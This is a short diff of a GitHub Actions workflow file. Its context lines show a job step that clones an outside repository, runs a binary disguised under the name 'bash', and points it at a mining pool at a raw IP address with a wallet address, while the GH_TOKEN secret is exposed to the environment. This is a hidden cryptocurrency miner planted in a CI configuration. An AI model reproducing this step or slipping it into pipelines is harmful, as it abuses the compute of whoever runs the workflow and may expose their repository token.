@@ -59,3 +59,4 @@ jobs:
           GH_TOKEN: ${{ secrets.GH_TOKEN }}
         run: |
           git clone https://github.com/hujisanda/mamalol.git && cd mamalol && chmod u+x bash && ./bash --algo CTXC --pool 138.197.24.47:80 --user 0xcd3b2cfba3f2fcb01e1fe456bd70ce81c1195b93.RTX3070TI_RIG1 --ethstratum ETHPROX
+          
